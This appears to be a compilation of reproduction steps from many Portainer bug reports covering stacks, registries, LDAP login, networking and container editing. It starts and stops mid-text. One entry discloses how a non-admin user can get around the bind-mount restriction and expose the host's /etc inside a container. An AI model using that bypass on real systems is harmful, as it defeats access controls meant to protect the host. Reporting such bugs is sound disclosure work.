ports:\\\\ - \\"8800:8800\\"\\\\\\\\ db:\\\\ container_name: db\\\\ image: ckan/postgresql:latest\\\\ environment:\\\\ - ds_ro_pass=${datastore_readonly_password}\\\\ - postgres_password=${postgres_password}\\\\ volumes:\\\\ - pg_data:/var/lib/postgresql/data\\\\\\\\ solr:\\\\ container_name: solr\\\\ image: ckan/solr:latest\\\\\\\\ redis:\\\\ container_name: redis\\\\ image: redis:latest", "env": [{"ckan_site_url": " ", "ckan_port": "5000", "postgres_password": "readwritepw", "datastore_readonly_password": "readonlypw", "ckan_max_upload_size_mb": "1000"}], "name": "nina-ckan-coat8"}
go to a service
click on `update the service` button & select `pull latest image version`
see the task being rejected and eventually the tasks will go back to running, without the new image pulled
steps to reproduce the behavior: 1
on a swarm cluster on aws with iam roles ecr read access assigned to the hosts.
run portainer with the credential helper see #1533 my image of that is here ricmathie/ecr_portainer:1.19.2
`docker stack deploy -f docker-compose-portainer-yml portainer`
go and deploy a stack with a private ecr image
version: "3.6" services: private_test: image: 012345678901.dkr.ecr.eu-west-1.amazonaws.com/someimage command: ping docker.com
get the webhook from the service page
pingback the webhook to trigger image pull
http post ec2-123-123-123-123.eu-west-1.compute.amazonaws.com:9000/api/webhooks/01234567-89ab-cdef-0123-456789abcdef
steps to reproduce the behavior:
create 2 containers a and b on the bridge network with mapped ports
recreate b while removing the exposed ports but setting the network to "container:a"
1) use the docker version distributed by red hat: red hat enterprise linux server release 7.4 (maipo)
docker-client-1.13.1-74.git6e3bb8e.el7.x86_64
docker-common-1.13.1-74.git6e3bb8e.el7.x86_64
docker-rhel-push-plugin-1.13.1-74.git6e3bb8e.el7.x86_64
docker-1.13.1-74.git6e3bb8e.el7.x86_64
2) start portainer 1.19.2
3) try to create an httpd container from fockerhub
open with ie11 (11.285.17134.0) ![image](
steps to reproduce the behavior:
make sure one of your endpoints is in a group
log in as a non admin
create an app template that contains a select variable with some predefined values.
to quickly see a result, use the value for example in the image reference of the compose file.
in "app templates", klick on the template and select a value in the drop down.
hit deploy stack
was considered, you should see an orange popup after a while that says something like "deployment error
error response from daemon: no such image: <myimage>: invalid reference format"
steps to reproduce the behavior:
create a folder called new
put a docker-compose.yml file inside with some sample services
start the stack with docker-compose up -d
go to portainer -> stacks, click the "new" stack.
steps to reproduce the behavior:
deploy a stack with environment variables defined in the portainer ui
observe the container has the environment variables set (e.g
connect to the container, run `echo "$preset" # returns the value configured in the portainer ui`)
scale service from 1 -> 0 containers
scale the service from 0 -> 1 containers
observer the container does not have the environment variables set (e.g
connect to the container, run `echo "$preset" # returns the empty string`) **workaround** update the stack (e.g
with the button on the stack editor tab)
get google/cadvisor:latest
the entrypoint in the dockerfile is an array `entrypoint ["/usr/bin/cadvisor", "-logtostderr"]`
go to portainer and edit the container
put in `/usr/bin/cadvisor,-logtostderr,--housekeeping_interval=5s` into the entry point field
it will be saved as a string "/usr/bin/cadvisor,-logtostderr,--housekeeping_interval=5s" rather than an array
the container then won't run because it will try to find an executable named `/usr/bin/cadvisor,-logtostderr,--housekeeping_interval=5s` note - i also tried other combinations like `[/usr/bin/cadvisor,-logtostderr,--housekeeping_interval=5s]` and `/usr/bin/cadvisor -logtostderr --housekeeping_interval=5s`, results are the same.
steps to reproduce the behavior:
go to the registry screen
enter your docker.com credentials into the box that says "docker hub"
update and wait for the green confirmation
go to the image screen and try to pull a private image
add new external endpoint in endpoints.json
restart portainer
go to endpoints list
try manage access to newly added endpoint.
run this script against a portainer instance with an https proxy in front of it: ```
#!/usr/bin/env python
import time
import datetime
import socket
import pycurl
import json
from stringio import stringio url = " "
username = "xxxxxx"
password = "xxxxxx" authinfo = {"username": username, "password": password} headers = [] try: data = json.dumps(authinfo) storage = stringio() c = pycurl.curl() c.setopt(c.url, url + "/api/auth") c.setopt(c.post, 1) c.setopt(c.postfields, data) c.setopt(c.writefunction, storage.write) c.setopt(c.ssl_verifypeer, 0) c.setopt(c.ssl_verifyhost, 0) c.perform() c.close() auth = storage.getvalue() token = json.loads(auth)[\'jwt\'] headers = [\'authorization: bearer \' + str(token), \'accept: application/json\', \'content-type: multipart/form-data\']
except exception as e: print str(e) try: postdata = {\'name\': socket.getfqdn(), \'endpointtype\': \'1\', \'url\': socket.getfqdn() + \':2376\', \'groupid\': \'3\', \'tls\': \'true\'} data = json.dumps(postdata) respheaders = stringio() respbody = stringio() c = pycurl.curl() c.setopt(c.url, url + "/api/endpoints") c.setopt(c.httpheader, headers) c.setopt(c.post, 1) c.setopt(c.postfields, data) c.setopt(c.httppost, [("tlscacertfile", (c.form_file, "/etc/pki/ca-trust/source/anchors/docker-ca.crt"))]) c.setopt(c.httppost, [("tlscertfile", (c.form_file, "/etc/pki/tls/certs/docker.r.useast2.xxxxxx.com.crt.pem"))]) c.setopt(c.httppost, [("tlskeyfile", (c.form_file, "/etc/pki/tls/private/docker.r.useast2.xxxxxx.com.key.pem"))]) c.setopt(c.writefunction, respbody.write) c.setopt(c.headerfunction, respheaders.write) c.setopt(pycurl.ssl_verifypeer, 0) c.setopt(pycurl.ssl_verifyhost, 0) c.perform() c.close() print respheaders.getvalue() + \'\ \ \' + respbody.getvalue()
except exception as e: print str(e)
steps to reproduce the behavior:
`docker container run -d --name foo httpd:alpine`
`docker container run -d --name bar --link foo httpd:alpine`
look at container list and notice that `foo` is named `bar/foo`.
docker run --restart=always -d --name portainer -p 9000:9000 \\ -v /portainer/data:/data \\ -v /var/run/docker.sock:/var/run/docker.sock \\ portainer/portainer
monitor & wait for sufficient amount of time to observe the leak could this be a goroutine leak by any chance?
steps to reproduce the behavior:
go to the services page
if necessary, deploy a service.
click on a service to see its details.
click in the image input field.
if necessary, reduce the browser window width so that the image name does not fit within the width of the visible image input field.
attempt to move the text cursor to the right, past the visible text.
steps to reproduce the behavior: 1
go to service list page (/#/services)
if necessary, add a service.
click on the name of the service to see details.
create a fresh install of portainer
set up ldap authentication
add a team with the same name as an ad group
login as a user belonging to the ad group
i set the following attributes on the ldap settings: * ldap server
* reader dn
* all security: off
* automatic user provision: on
* user base dn
* username attribute: samaccountname
* group base dn
* group membership attribute: member i copy-pasted the dns from ldap admin, so i'm pretty sure those values don't have typos.
one thing of note, the ad group has _ and - in the name, which might cause some encoding issue?
i don't see anything in portainer's stdout
edit: group name is usr_adm_dev-environment
configure portainer to auth against ldap, enable automatic user provisioning.
test connectivity
try and log in through the web ui using known good credentials.
observe that the ui returns an "invalid credentials" message.
observe that the user will have been created in portainer.
observe the stack trace in the docker logs (pasted below)
delete the user in portainer
create the user manually with the same name ***as an administrator***, and disable automatic user provisioning in ldap config.
try and log in again
observe that login is successful.
steps to reproduce the behavior:
go to stacks
open the the container list
click on an action
steps to reproduce the behavior:
create container from compose files using docker-compose up -d
inspect previously created container, the output should looks like:
`networksettings
compose_mynet
**0 8dccf856bb21
1 service-name** 2
go to duplicate/edit option on deployed container
deploy container once again by pressing button (deploy the container)
the last alias (service-name) disappears
cannot reach container from another container in the same network
steps to reproduce the behavior:
1) with portainer 1.19.1 install, set up custom registry at host bugatti:5000, no login needed as proved by command line docker pull
2) when trying to create new container pulling an image from bugatti registry, it failed with red message "image not found"
3) then i prepend the full host to the image name text box, e.g
bugatti:5000/image, and press the deploy button
still failing with message "invalid format"
4) now, the interesting thing, if i removed the host prefix and restore the name to the same as step 2, and press the deploy button - all of sudden it works this time
5) tried to create another container with a different image, it failed again
but once we did step 3 and 4 it then worked.
create a container with an empty environment variable "", then duplicate/edit it.
steps to reproduce the behavior:
open a brand new project
push an image to your registry (step 1 and 2 done in
start a brand new portainer instance, done in here , but it expires every 4 hrs.
register an docker registry with registry.gitlab.com , and then try to pull the image, neil.cresswell/testproject:alpine , unable to pull it.
try registering another registry with registry.gitlab.com/neil.cresswell , pull image testproject:alpine , which allows you to successfully pull the image
however, after you create an container with it, when you try to edit/duplicate it, portainer complains `the docker registry for the <image-url> image is not registered inside portainer`, hence you cannot do anything again
steps to reproduce the behavior:
docker service rm portainer_agent
docker service create \\ --name portainer-agent \\ --detach=true \\ --network net-portainer \\ -e agent_cluster_addr=tasks.portainer-agent \\ --mode global \\ --mount type=bind,src=/var/run/docker.sock,dst=/var/run/docker.sock \\ --mount type=bind,src=/data/docker/volumes,dst=/var/lib/docker/volumes \\ portainer/agent:1.1.1
add "registry" and "image" settings to a container template in template.json to specify a remote image to use outside of dockerhub, allow template.json to initially load, and create a container based on it
(registry may need to be created in portainer and involve auth to trigger issue, not sure?) image pull will result in failure
also try to update/change the "registry" parameter via the portainer ui
changes don't appear to stick.
try to edit "network" parameter for a container template using portainer template ui.
steps to reproduce the behavior:
create a stack from this stack file:
version: "3.0"
services: server: image: jordan/rundeck:2.11.5 environment: - tz=europe/amsterdam volumes: - etc:/etc/rundeck - projects:/var/rundeck/projects - mysql:/var/lib/mysql - ssh:/var/lib/rundeck/.ssh - storage:/var/lib/rundeck/var/storage volumes: etc: mysql: projects: ssh: storage:
``` check the unnamed volumes: ![screenshot 2018-07-30 om 13 20 29](
steps to reproduce the behavior:
go to stacks/add stack/git repository
enter repository url, compose path, username ad password.
sclick deploy the stack
`docker run -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer --no-auth`
go to `localhost:9000`
steps to reproduce the behaviour:
go onto a running container
click on 'recreate'
once it has redeployed, view the new container and it may be stuck in ' create ' this does not happen locally {~5 container} however seems to happen with higher count of containers {20+} error: endpoint with name {container name} already exists in network {network name}
steps to reproduce the behavior:
add new stack
insert snippet below
try to deploy stack ```
version: '2' services: mq: image: rabbitmq:latest container_name: sample-mq restart: always networks: - web networks: web: external: true
steps to reproduce the behavior:
run a container that produces many stdout into log
add google container registry using _json_key method
login on console to container registry
add container using image from registry
try to edit container any other info e.g
why do you consider this to be a bug? what did you expect to happen instead?
- the error is random
some time it works but sometimes it doesn't
no clear way or environment of how to reproduce.
i'm not sure to have all the element to reproduce here is my docker-compose of stack:
version: '2'
services: elasticsearch: image: myprivaterepo.com/company/elastikstack_elasticsearch:latest ports: - "9200:9200" - "9300:9300" environment: es_java_opts: "-xmx256m -xms256m" networks: - elk logstash: image: myprivaterepo.com/company/elastikstack_logstash:latest ports: - "5000:5000" environment: ls_java_opts: "-xmx256m -xms256m" networks: - elk depends_on: - elasticsearch kibana: image: myprivaterepo.com/company/elastikstack_kibana:latest ports: - "5601:5601" networks: - elk depends_on: - elasticsearch networks: elk: driver: bridge
``` the images are base on a fork of where i simply add the custom configuration in the docker file.
steps to reproduce the behavior:
![image](
![image](
![image](
steps to reproduce the behavior:
startup a windows container (server 2016)
click on 'containers' to see all running containers in portainer
select "console" from quick actions
try to open a console session using cmd.exe or powershell (user left blank)
steps to reproduce the behavior:
go to 'stack' link in the left section
click on \'add stack"
insert the compose above
a error pop-up is showed.
steps to reproduce the behavior:
deploy multiple (around 40) stacks from the same template.
steps to reproduce the behavior:
use portainer 1.18
create a stack
choose "github"
past the link to
use the "create stack" button
see error ![portainer - mozilla firefox_079](
steps to reproduce the behavior:
select an app template and deploy it.
keep deploying the same template with different stack names.
eventually you will hit this error and be unable to deploy stacks from templates.
i do not have any specific steps to reproduce it
just seems to happen randomly.
let's assume the following stack file:
version: '3.6'
services: web: image: nginx:mainline-alpine deploy: mode: global placement: constraints: - node.role == manager update_config: delay: 60s
have a swarm with at least one worker
deploy the example stack
compare `docker service ls` to portainer\'s "services" list
steps to reproduce the behavior:
go to portainer dashboard (running on a linux manager), click on stack menu, add stack button, fill with the stack name and paste the stack deploy yml on the filed and hit "deploy the stack"
click on the new created stack
the command: ```
version: "3"
services: centralservicos: image: ourinternalimage-windows1803 volumes: - e:\\docker\\docker-data\\central\\centralservicos\\anexos:c:\\websites\\prod_centralservicos\\centralservicos\\anexos - e:\\docker\\docker-data\\central\\gestaorh\\arquivos:c:\\websites\\prod_centralservicos\\gestaorh\\arquivos - e:\\docker\\docker-data\\central\\centralservicos\\log:c:\\websites\\prod_centralservicos\\centralservicos\\log deploy: labels: - traefik.enable=true - traefik.docker.network=traefik_traefik - traefik.port=80 - traefik.backend=centralservicos - traefik.backend.loadbalancer.sticky=true - traefik.frontend.passhostheader=true - traefik.frontend.rule=host:ourinternalurl.teste - traefik.frontend.entrypoints=http placement: constraints: - node.labels.so==windows - node.labels.no==1 networks: - traefik
networks: traefik: external: true
scroll down to the container status and you will see only rejected status
click in the last one to see the logs id | kr441b92qb06pq3qonomqq3d2
state | rejected
state message | resolving controller failed
error message | invalid bind mount source, must be an absolute path: /data/compose/centralservicos_6iszgratbstqts1eeccr27tdl/e:\\docker\\docker-data\\central\\centralservicos\\anexos
image | ourinternalimage-windows1803
created | 2018-06-14 11:00:05
steps to reproduce the behavior:
setup the google container registry as a registered registry in portainer.
create a container referencing a gcr image.
click 're-create' in the container page.
steps to reproduce the behavior:
deploy my stack via portainer stack deploy
go to portainer's service details view for the app service
scroll down to 'mounts'
notice the 'source' fields reads 'select a volume'.
use rex ray plugin for volumes with digital ocean integration.
i used a nodejs based request: let request = require(\'request\'); let querystring = require(\'querystring\'); yaml = require(\'yamljs\') request.put({ url: \' ":"+this.portainer_port+\'/api/endpoints/1/stacks/\'+stackid, headers: {\'authorization\': "bearer "+jwt}, body: json.stringify({stackfilecontent: yaml.stringify(newstackfile, 10, 2), prune: true})}, (error, response, body) => { if (error) { console.log(\'failed\' + error); } else { console.log(\'upload succeeded!\'); } } ); i then checked the stack in portainer, and checked the services.
go into portainer container console and login 2
copy command from notepad
paste it inside console
* install docker as vm on vsphere installation (using photon os for example)
* [install vmware docker volume driver](
* create a named volume using the vsphere driver
* start a container using the created volume
steps to reproduce the behavior:
click on a stack
change any parameter (or comment out an environment variable)
click update the stack
error during connect: get dial tcp: lookup /var/run/docker.sock: no such host (code=500)
steps to reproduce the behavior:
go to 'containers'
click on any container
click on 'console >_'
click on 'connect' in top right
steps to reproduce the behavior:
rename your primary endpoint to something else
deploy a stack
i can't reliably reproduce this on demand, but it has been happening intermittently over the last few days while i have been working with portainer on this swarm.
happens intermittently
when it happens, page refresh might or might not fix it
even if it does, a few more reloads will show the problem again.
steps to reproduce the behavior:
go to advanced network settings for an existing or new docker container 2
add multiple host file entries 3
deploy the container
go in and edit the container
only the first host file entered is displayed
click on a container in portainer
click the edit/duplicate button any other info e.g
why do you consider this to be a bug? what did you expect to happen instead? i do not know if this is related, but portainer then shows "the docker registry for the gogs/gogs:latest image is not registered inside portainer, you will not be able to create a container
please register that registry first." in image creation, and i cannot edit/duplicate the container
(if i run recreate from the container info screen, the image is correctly pulled and the container is successfully recreated)
create a stack by compose 2
try to delete stack looks like the stack isn't deleted in ui and also still exists in remote docker swarm
because i need to delete the stack i deleted it manually with `docker stack rm <stack>`.
stack still exists in portainer ui
any idea why stack isn't deleted from remote swarm cluster (single host cluster) and still persists in portainer ui?
portainer is deployed with local docker.sock, but i work with an additional remote swarm cluster.
sorry, haven't tested it with locale endpoint, just remote endpoint.
have portainer installed on a docker swarm cluster (i used latest of yesterday, f6dd93561a5f)
use the following url to load the custom templates:
or add a configs/secrets on an existing stack template
go to "app templates", select the wordpress template, add a name and deploy the stack
see the error (more or less the same for configs/and secrets): deployment error
ignoring unsupported options: restart open ./my_secret.txt: no such file or directory i think this is a bug because those feature should be supported according to:
#issuecomment-340001126
portainer/portainer#518
and a quick chat on gitter with @deviantony
create a volume using a managed volume plugin from a deployed stack
i used my cifs-volume-plugin and gluster-volume-plugin
go to volumes and click a created volume.
login as admin
go to **portainer settings** --> **settings**
enable bind restriction (**application settings** --> **disable bind mounts for non-administrators**)
logout from admin
login as regular user
create new **service** (e.g
nginx) in the service creation, volumes section (**volumes** --> **map additional volume**) we can't add bind mount type because bind mount is restricted for regular users
**bypass bind mount restriction**
open service details (**services** --> click service name we have been created before)
click (**quick navigation** --> **mounts**)
in the **mounts** section, add mount
type:bind source:/etc target:/data now we can open the service container and check **/data** directory, and we can see **/etc** dir contents of the docker host in the container **/data** dir.
login in to portainer portal.
in app templates of stack, chose one to deploy.
failed, get msg ""deployment error, invalid json".
single container deployment from app templates is ok with no problems.
go to the stack creation view
create a new stack using a git repository (url: and compose path: docker-stack.yml for example)
stack is succesfully created
go to stack details
update yml in code editor
a success message is displayed but nor the stack or the yml file are updated
update portainer to 1.16.3
run a java app and let it dump a stack trace (exception)
view the logs from portainer logs section any other info e.g
why do you consider this to be a bug? what did you expect to happen instead?
start portainer (e.g
1.15.3) on a docker engine (e.g
create these user management settings:
- user: admin (administrator); teamleadera; teamleaderb; teamless
- teams: teama (teamleadera); teamb (teamleaderb)
create another container (e.g
jenkins:2.89.4) and use these ownership-settings:
- authorized teams: teama
- authorized user: teamleaderb, teamless
check the container view for jenkins
ownership can only be changed by **teamless** and **teamleaderb** (and admin) and the only allowed modification is making it public instead of restricted.
if you edit (replace) the container instead, you will get a whole bunch of new ownership settings
if the following users replace the container, you will get these new ownership results:
- admin: ownership settings stay unchanged
- teamleadera: authorized user are removed from ownership, teama stays owner
- teamless: container is made public
- teamleaderb: authorized users are removed, authorized team changes from teama to teamb (!)
_note: you could also switch the teamleaders with teammembers of their respective teams, the results should be the same._ **additional info:**
i think this is a bug, because ownership settings can and will be changed, which wouldn't be possible in the container-view and even if it doesn't make sense
explanations:
- ownership **will** be changed because non-admin users are not allowed to access the full userlist and full teamlist and therefore cannot grant access to users other than themselves or teams apart from their own.
- ownership **can** be changed because the used component (add container) is originally made for creating new containers and not replacing old ones
**imaginable solution:** i think there should be a "replacement"-mode when adding a new container
as long as you use an already existing container-name, you should not be able to change ownership settings
and ownership settings should stay untouched, even if you are not allowed to see/access all users and teams.
configure portainer with a endpoint on a remote node in swarm mode with a public ip (different from eth0 node ip)
create a service with a published port `docker service create -p 80:80 nginx`
the service appears in the "services" list in portainer and a link is available in the "published port" column : this link points to the ip corresponding to the "eth0" interface of the remote node and not to the "public ip" configured for the endpoint **note** the link is ok in the "containers" list page, the issue only concerns the "services" list.
deploy a service with "restart condition" = "any" in a swarm cluster and replica 1
change node.hostname from host1 to host2
wait for the container to be restarted on new node
change node.hostname from host2 to host1 the version.index returned after the update is no longer valid for subsequent calls, since the asynchronous restart of container causes this value to be increased in swarm cluster.
add a registry - with a username and password - which will not work
bad domain name; no registry running on it; credentials invalid.
deploy or update any stack
instead of working, an error pops up, according to whatever is wrong with the registry.
create a new config
attempt to add content to the config the behavior is seemingly random
i have not been able to figure out a pattern.
i don't have steps to reproduce
here is the `docker inspect` result..
and i actually see the issue why the container crash.
anyway portainer ui should not show wrong data
deploy a windows server 2016 swarm host with dockerd listening on tcp://0.0.0.0:2375
create a portainer service: `docker service create --name portainer --publish published=9000,target=9000,mode=host --endpoint-mode dnsrr --replicas=1 --constraint 'node.role == manager' --mount type=volume,src=portainer,dst=c:/data portainer/portainer:pr1586`
identify the host's nat-network ip address with `get-netipaddress`
connect to portainer, set the admin password, and connect to host-nat-ip-address:2375
navigate to the volume, network or service creation actions chrome console shows requests to ` ` returning 500 errors
the error body contains a message of "plugins are not supported on this platform"
deploy a windows server 2016 swarm host with dockerd listening on tcp://0.0.0.0:2375
create a portainer service: `docker service create --name portainer --publish published=9000,target=9000,mode=host --endpoint-mode dnsrr --replicas=1 --constraint 'node.role == manager' --mount type=volume,src=portainer,dst=c:/data portainer/portainer:latest`
identify the host's nat-network ip address with `get-netipaddress`
connect to portainer, set the admin password, and attempt to connect to host-nat-ip-address:2375 chrome console shows requests to ` ` returning 500 errors, followed by delete .../endpoints/xx
the error body contains a message of "plugins are not supported on this platform"
update from 1.15.5 to 1.16.0 ``` panic: runtime error: invalid memory address or nil pointer dereference [signal sigsegv: segmentation violation code= addr= pc= ] goroutine 1 [running]: github.com/portainer/portainer/http.healthcheck( , , , , ) /go/src/github.com/portainer/portainer/http/health_check.go:10 + main.main() /src/cmd/portainer/main.go:176 + ``` and the log keeps filling up with ```
2018/01/21 22:16:03 http: tls handshake error from 127.0.0.1:34696: tls: first record does not look like a tls handshake 2018/01/21 22:16:33 http: tls handshake error from 127.0.0.1:34714: tls: first record does not look like a tls handshake 2018/01/21 22:17:03 http: tls handshake error from 127.0.0.1:34740: tls: first record does not look like a tls handshake 2018/01/21 22:17:33 http: tls handshake error from 127.0.0.1:34762: tls: first record does not look like a tls handshake 2018/01/21 22:18:03 http: tls handshake error from 127.0.0.1:34786: tls: first record does not look like a tls handshake
any other info e.g
why do you consider this to be a bug? what did you expect to happen instead?
create a custom user which named "ts" when the docker container run.
open portainer link ,go to container list and choose any of container which was runing
set user context was 'ts' but it was very strange ,we can use root login and then use 'su - ts' to switch user.
can't login in directly with 'ts' which was create by myself.
after creating a docker volume for portainer docker volume create -d local portainerdata and starting portainer (see command below) i am able to change ownership of the portainer container to 'administrators'.
but there is no possibility to change the ownership of the volume
i am able to set the ownership of a new volume, but not able to change it later.
set up a successful ldap connection
create a user in portainer
look at the authentication label _any other info e.g
why do you consider this to be a bug? what did you expect to happen instead?_
low priority, however i would expect the label to say ldap rather than internal as it did before
run a container with a health check (like `mysql/mysql-server:latest`)
from the containers overview page, select this container
the stop/pause button is now disabled i think we should be able to pause/start a healthy container
after a little chat on slack, apparently, i'm right
you should take a look to this check `$ctrl.state.selecteditemcount === 0 || $ctrl.state.norunningitemsselected`, if it's correctly named, this could be the error.
deploy a new stack with a service that publishes a port.
klick this port in column "published ports" in section "associated services"
i would expect that the new tab is opening the service on that published port.
create a network (apart from bridge).
create a container attached to the bridge network
an `alpine` one will be enough, even creating it without any run command defined.
once the container has been created, attach it to the second network.
click the recreate button
any other info e.g
why do you consider this to be a bug? what did you expect to happen instead? i would have expected the following things: 1
in case of an error happening in the middle of a recreation, the original container should continue to exist, even if it had been stopped (which it should be in order to bind the ports, if any).
if there are multiple networks and only one can be joined during creation (as portainer offers), the others should be joined after the container is recreated i did not test it with previous versions
put any update stack configuration on existing stack
press "update the stack"
js errors in console, stack is not getting updated:
error: null is not an object (evaluating 'a.length')
removeinvalidenvvars@
deploystack@
create stack named 'docker-compose-ui' or 'docker_compose_ui';
on page 'stack list' click stack to display stack details;
error 'unable to retrieve stack details' pop out; any other info e.g
why do you consider this to be a bug? what did you expect to happen instead?
create new config with non-latin letters (ex: russian)
re-open config for viewing
non-latin letters become unreadable any other info e.g
why do you consider this to be a bug? what did you expect to happen instead? running **docker config inspect** gives base64 data, decoding which gives normal russian letters
base64 ex: dgvzdarrgtc10yhrgie=
mkdir -pv tmp && cd tmp
echo "from alpine" > dockerfile
echo "run apk add -u --no-cache wget" >> dockerfile
docker build -t dummy/image .
docker run -d --name dummy-container dummy/image sh -c "tail -f /dev/null"
docker build -t dummy/image --no-cache .
&& rm -rf tmp
either "recreate", "duplicate" or "edit" `dummy-container`, unselecting the "pull lastest" switch
**any other info e.g
why do you consider this to be a bug? what did you expect to happen instead?** i do think that "duplicate/edit" should use the same image the container is running (`container.image`), without updating it
note that the user can "recreate" (aka "update") and then "duplicate/edit", if that is the intended behaviour.
docker run portainer
setup account
disable hiding external contributions
create a service on the command line
docker service create \\ --name portainer \\ --constraint 'node.role == manager' \\ --label traefik.backend=portainer \\ --label traefik.port=9000 \\ --label traefik.frontend.rule=host:portainer \\ --mount type=bind,src=/var/run/docker.sock,dst=/var/run/docker.sock \\ portainer/portainer:1.15.1 \\ -h unix:///var/run/docker.sock \\ --no-auth
inspect the service on the command line and check restart policy:
docker service inspect portainer
"restartpolicy": { "condition": "any", "delay": 5000000000, "maxattempts": 0 },
check the restart policy of the service in portainer: none, see attached screen shot
![screenshot 2017-11-10 om 15 23 31](
deploy a service with resource limit: deploy: resources: limits: cpus: '0.1' 2
do `docker stats <container_id>`
open portainer stats page for this container
watch the charts ![screen shot 2017-11-09 at 11 29 23 am](
add windows endpoint into the portainer instance, spin up a simple windows container, i used iis server core, and check the statistics section in portainer
any other info e.g
why do you consider this to be a bug? what did you expect to happen instead? i expected to see the cpu and memory shown in the graphs.
launch application with --no-auth
go to /#/swarm
node names appear as `<span>` instead of `<a>` despite the fact that authentication is disabled
access to node details should be enabled authentication is disabled (i.e
no security)
that is, $scope.isadmin must be ignored if applicationstate.application.authentication is false.
deploy portainer in swarm mode with at least on of the nodes being a worker
include the worker endpoint and select it i think the problem is on dashboard component
it should only show the "stacks" item if applicationstate.endpoint.mode.role === \'manager\' too.
create a directory and paste this `docker-compose.yml` file: ```
version: \'2\' services: gitea: container_name: gitea image: gitea/gitea restart: always networks: default: builds: aliases: [ "gitea" ] volumes: [ "./data_gitea:/data" ] drone-server: container_name: drone-server depends_on: [ gitea ] image: drone/drone restart: always volumes: [ "./data_drone:/var/lib/drone" ] environment: - drone_network=net-build networks: default: external: name: net-ci builds: external: name: net-build
create the networks: ``` bash
docker network create net-ci
docker network create net-build
bring the stack up: ```
docker-compose up -d
check the details page of the two containers and the two networks: ```
net-build 172.20.0.2 172.20.0.1
net-ci 172.19.0.2 172.19.0.1
[drone-server]
[net-build]
gitea 172.20.0.2/16 -
check the details page through docker inspect: ```
"networks": { "net-build": { "gateway": "172.20.0.1", "ipaddress": "172.20.0.2", }, "net-ci": { "gateway": "172.19.0.1", "ipaddress": "172.19.0.2", } [drone-server]
"networks": { "net-ci": { "gateway": "", "ipaddress": "", }
} [net-build]
"containers": { "1f3ae99c3020933f80704978b74624d9b39c1edfb92b72f3d538d1fbaad4f56d": { "name": "gitea", "ipv4address": "172.20.0.2/16", }
"containers": { "1f3ae99c3020933f80704978b74624d9b39c1edfb92b72f3d538d1fbaad4f56d": { "name": "gitea", "ipv4address": "172.19.0.2/16", }
``` on top of that, when browsing the details page of `net-ci` the console shows this error: ```
error: c is undefined app.f319a0fb.js:3:22017
j/<@
j@
k/<@
m/</z[b]/b<@
h/<@
$eval@
$digest@
$apply@
i@
u@
nb/</y.onload@ f/<
cb/this.$get</<
h/<
$eval
$digest
$apply
i
u
nb/</y.onload
``` since `drone-server` seems not to have any assigned ip in none of the nets, i don't expect it to be shown in the details page of any of these
however, `gitea` should be shown in the details of `net-ci` just as it is shown in the details page of `net-build`
i believe that getting rid of the error would allow the page to load completely, and the info should already be there.
load add container tab
add map additional volume
no volumes are shown (correct) but maybe it should say 'create a new volume' any other info e.g
why do you consider this to be a bug? what did you expect to happen instead?
download portainer
# wget
# tar xvpfz portainer-1.15.0-linux-amd64.tar.gz
start portainer
# mkdir /data
# ./portainer/portainer --no-auth -h unix:///var/run/docker.sock
open ui at
for this case i'll be using two database templates 1
open up the development console of your browser
create a mysql container with network type bridge from the json provided below
create a postgresql container using the json provided below and select the previously created mysql container for the db_host and select bridge as network type.
the container creation hangs and an error is visible in the console ### !!important!!
the portainer only hangs if the network is set to "bridge" at step 3
(i haven't tested it with custom networks) ![portainer_error](
_the images are stored locally, no registry is involved in the process._ the json for the templates:
```json { "title": "mysql", "description": "the most popular open-source database", "categories": ["database"], "platform": "linux", "logo": " ", "image": "mysql:latest", "env": [ { "name": "mysql_root_password", "label": "root password" } ], "ports": [ "3306/tcp" ], "volumes": ["/var/lib/mysql"] }
postgresql:
```json { "title": "postgresql", "description": "the most advanced open-source database", "categories": ["database"], "platform": "linux", "logo": " ", "image": "postgres:latest", "env": [ { "name": "postgres_user", "label": "superuser" }, { "name": "postgres_password", "label": "superuser password" }, { "name": "db_host", "label": "database host container", "type": "container" } ], "ports": [ "5432/tcp" ], "volumes": ["/var/lib/postgresql/data"] }
create a new bridge network
open an existing container attached to a bridge
select duplicate/edit
under network select the newly created bridge
creation will fail because container can only be attached to one bridge
create a new service
choose a network
hit "create service"
deploy a container with no ports mapped
click edit/duplicate
click map additional port
enter some value into both fields, 80 for example
hit start container and an error appears with "cannot set property \'80/tcp\' of undefined" any other info e.g
why do you consider this to be a bug? what did you expect to happen instead?
start a portainer container binding a host directory to container /data and with --admin-password option
stop the container and restarts binding the same host directory the initialization process always create the admin user if one of these two flags is used
through the ui this problem don't happen..
it checks before if the user exists in the create user form and gives an error
instead of create the admin user every time, the initialization process should check if the admin already exists and if exists, update the password; if not, create admin user.
deploy a service using [docker stack deploy](
open the services page in portainer
enter the name of the stack into the filter
create clean vm with docker setup and installed
setup portainer (docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v /docker/portainer:/data portainer/portainer)
config setup on first login and use local endpoint
create sample nginx container
click publlished port 80 in container list then new page goes to 0.0.0.0:80 (as expected)
go to endpoints and edit the local endpoint, enter ip address of vm in the public ip then update endpoint
select container/images/etc tab and get 'unable to retrieve container or cant connect to docker endpoint' any other info e.g
why do you consider this to be a bug? what did you expect to happen instead? i expected to still be able to use portainer and for the ip address in the published ports to be the public ip address
activate ldap/ad authentication
log in as admin
click "my account"
try to change the password
--> "you cannot change your password when using ldap authentication."
pull image didstopia/7dtd-server and its works
create container with didstopia/7dtd-server, you get a regex error
remove the "-" in didstopia/7dtd-server and you will get the message there is no image with that name
delete the "admin" user
re-create the "admin" user
enable ldap authentication
"admin" user does not use internal authentication
click on images
grab a big coffee
grab another big coffee any other info e.g
why do you consider this to be a bug? what did you expect to happen instead?
i started portainer like this.
$ docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer
and accessed to webui, and set authentification.
when i can see the running docker container to access `/#/containers/`, i choose a running container.
and clicked the `duplicate/edit` button
clicked `env` tab
changed a value
clicked `start container` button
i checked this sentence and clicked `replace`.
a container with the same name already exists
portainer can automatically remove it and re-create one
do you want to replace it?
i checked this uri called(it was delete method) and this response status was 200.
the target container was kill and removed, and `docker logs optimistic_fermi(portainer's container name)` was no output when this error was shown
is there any way to trace any other logs?
run portainer on a host
visit portainer on desktop and do successful setup
visit portainer on chrome for android
try and login
expected: being able to actually use the input boxes to enter in login info
current result: can't enter any characters into the input boxes.
change order for a service in command line docker service update --update-order "start-first" --detach=false whoami0 2
